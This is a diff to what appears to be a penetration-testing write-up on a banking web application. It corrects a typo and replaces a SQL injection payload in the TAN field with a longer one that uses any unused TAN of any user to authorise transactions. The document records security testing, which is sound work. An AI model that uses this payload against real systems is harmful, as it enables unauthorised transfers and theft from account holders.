@@ -146,10 +146,10 @@ Append  `" GROUP BY <colname> HAVING "1"="1`. It will say nothing, if the column
 
 #### Perform transaction without TAN (SQL injection)
 
-In the TAN line, the parser apparently stops scanning the line after the first whitespace. This makes things more difficault, but not impossible:
+In the TAN line, the parser apparently stops scanning the line after the first whitespace. This makes things more difficult, but not impossible:
 
 ```
-"OR(NOT(`id`IN(SELECT`id`FROM`payment`)))AND"x"="x
+"OR(NOT(`id`IN(SELECT`trancode`FROM`payment`)))AND(NOT(`id`IN(SELECT`trancode`FROM`paymentrequest`)))AND"x"="x
 ```
 
 This was found by manual testing and will use any unused TAN of any user. Potentially, the TANs of all users could be compromised.
